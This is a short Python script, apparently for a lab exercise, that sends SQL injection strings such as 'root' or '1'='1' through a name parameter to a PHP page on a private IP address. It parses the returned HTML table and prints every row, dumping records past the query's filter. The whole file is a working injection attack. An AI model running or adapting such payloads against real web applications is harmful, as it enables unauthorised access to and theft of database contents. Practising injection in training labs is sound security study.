import urllib.parse
import urllib.request
import lxml.html as lh


# payload = "name=root"
payload = {"name": "root' or '1'='1"}
# payload = {"name": "root' or '1'='1'#"}
# payload = {"name": "root' or '1'='1'-- "}
payload = urllib.parse.urlencode(payload)
url = "http://10.0.1.14/sqli/example1.php?"+payload
print(url)

with urllib.request.urlopen(url) as response:
	content = response.read()


doc = lh.fromstring(content)
tr_elements = doc.xpath("//tr")
for l in tr_elements:
	for e in l:
		print(e.text_content(), end=" | ")
	print("")

